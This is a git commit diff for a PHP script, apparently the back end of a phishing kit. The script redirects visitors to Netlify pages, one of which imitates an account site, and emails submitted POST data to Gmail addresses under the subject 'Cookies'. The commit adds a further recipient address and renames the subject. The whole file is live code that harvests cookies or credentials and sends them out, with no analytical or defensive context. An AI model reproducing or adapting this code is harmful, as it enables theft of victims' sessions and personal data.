06a09e2cd56077a7ee6c26129fe154cc656f5d97
Uzr44911 <ahmjtalijaan@gmail.com>
2025-07-22 13:31:29 +0500

    Update and rename Nisar.php to Zkr.php

--- Zkr.php
+++ Zkr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://sure-acvount-onw-info.netlify.app/");
+header("Location: https://coruscating-valkyrie-c25511.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -37,13 +37,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('morginmocin@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'nisar Cookies';
+        $mail->Subject = 'zkr Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
